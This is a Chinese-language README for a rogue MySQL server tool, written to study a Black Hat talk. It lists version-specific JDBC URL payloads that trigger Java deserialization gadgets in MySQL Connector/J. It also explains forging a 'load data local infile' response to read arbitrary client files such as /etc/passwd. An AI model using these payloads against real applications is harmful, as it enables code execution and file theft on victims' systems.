# fmysql

一个基于 [netty-mysql-codec](https://github.com/mheath/netty-mysql-codec) 开发的恶意 MySQL 服务器。出于学习 [https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf](https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf) 的内容而编写。


> 在 JDBC URL 可控的条件下攻击 MySQL JDBC Driver。

## 反序列化

Poc 代码位于 `test/java/com/github/trganda/dser` 下，使用的 Gadget 为 [CommonsCollections5](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java)。

### `ServerStatusDiffInterceptor` 参数触发

#### 8.x

```java
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

#### 6.x

属性名不同，变更为 `statementInterceptors`

```java
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

#### 5.1.11 - 5.x

```java
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor
```

> `5.1.10` 及以下的 `5.1.X` 版本：同上，但是需要连接后执行查询。

#### 5.0.x

没有 `ServerStatusDiffInterceptor`，不可利用。

### `detectCustomCollations` 触发：

#### 5.1.41 - 5.1.x

不可用

#### 5.1.29 - 5.1.40

```java
jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true
```

#### 5.1.19 - 5.1.28

```
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true
```

#### 5.1.x - 5.1.18

不可用

#### 5.0.x

不可用

## 任意文件读取

Poc 代码位于 `test/java/com/github/trganda/file` 下。

MySQL 支持 `load data local infile` 语句读取文件发送至服务端。

```sql
load data local infile "/etc/passwd" into table foo FIELDS TERMINATED BY '\n';
```

通信流程如下，可以通过伪造响应内容 `0xFB + 需要读取的文件路径`，让客户端读取任意文件

<img width="438" alt="image" src="https://github.com/trganda/fmysql/assets/62204882/c8c5500f-a731-4640-b85e-e1147fe354d6">


